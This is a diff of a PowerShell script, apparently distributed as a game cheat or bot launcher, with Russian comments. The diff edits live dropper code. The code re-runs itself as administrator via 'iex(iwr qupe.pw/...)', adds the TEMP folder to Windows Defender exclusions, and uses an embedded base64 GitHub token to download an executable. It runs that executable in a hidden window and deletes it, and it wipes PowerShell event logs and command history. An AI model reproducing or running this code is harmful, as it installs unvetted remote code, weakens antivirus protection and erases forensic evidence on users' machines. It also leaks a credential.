@@ -7,7 +7,7 @@ function Ensure-RunAsAdmin {
 
         # Построение аргументов для повторного запуска
         $scriptPath = $MyInvocation.MyCommand.Definition
-        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr qupe.pw/cheat)`""
+        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex(iwr qupe.pw/RF4BOT)`""
 
         # Настройка параметров нового процесса
         $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -49,38 +49,30 @@ function Set-RegistryValue {
 }
 
 function ClrHistory {
+
     try {
-        # Определяем версию Windows
-        $windowsVersion = (Get-CimInstance Win32_OperatingSystem).Version
-        $majorVersion = $windowsVersion.Split('.')[0]
-
-        if ($majorVersion -lt 10) {
-            # Для Windows 7 и 8
-            if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
-                Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
-            }
-        } else {
-            # Для Windows 10 и выше
-            wevtutil clear-log "Windows PowerShell"
-            wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
+        # Write-Host "Clearing logs and history..." -ForegroundColor Green
+        
+        # Очистка журнала PowerShell
+        if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
+            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
         }
 
-        # Удаление истории команд PSReadLine
-        $historyPath = (Get-PSReadlineOption).HistorySavePath
-        if (Test-Path $historyPath) {
-            Remove-Item $historyPath -Force -ErrorAction Stop
-        }
-
-        # Удаление AppData PowerShell (необязательно, но на всякий случай)
+        # Удаление директории PowerShell в AppData, если она существует
         $powershellDir = Join-Path $env:AppData 'Microsoft\Windows\PowerShell'
         if (Test-Path $powershellDir) {
             Remove-Item $powershellDir -Recurse -Force -ErrorAction Stop
         }
 
-        Write-Host "История PowerShell успешно очищена!" -ForegroundColor Green
+        # Удаление файла истории PSReadLine
+        $historyPath = (Get-PSReadlineOption).HistorySavePath
+        if (Test-Path $historyPath) {
+            Remove-Item $historyPath -Force -ErrorAction Stop
+        }
 
     } catch {
-        Write-Host "Ошибка очистки: $($_.Exception.Message)" -ForegroundColor Red
+        # Write-Host "Error clearing history: $($_.Exception.Message)" -ForegroundColor Red
+        # Start-Sleep -s 1
     }
 }
 
@@ -100,18 +92,18 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {	}
+	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {}
 
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
 		$q = '"'
         $h = @{"Authorization" = "$String"}
-        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher_dll.exe' -Method 'GET' -Headers $h
+        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $h
 		Invoke-WebRequest $response.download_url -OutFile $contFile
         if (Test-Path $contFile) {
 			try {
-				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`""
+				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`"" -WindowStyle Hidden
 			} catch {
 				Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
 				Start-Sleep -s 3
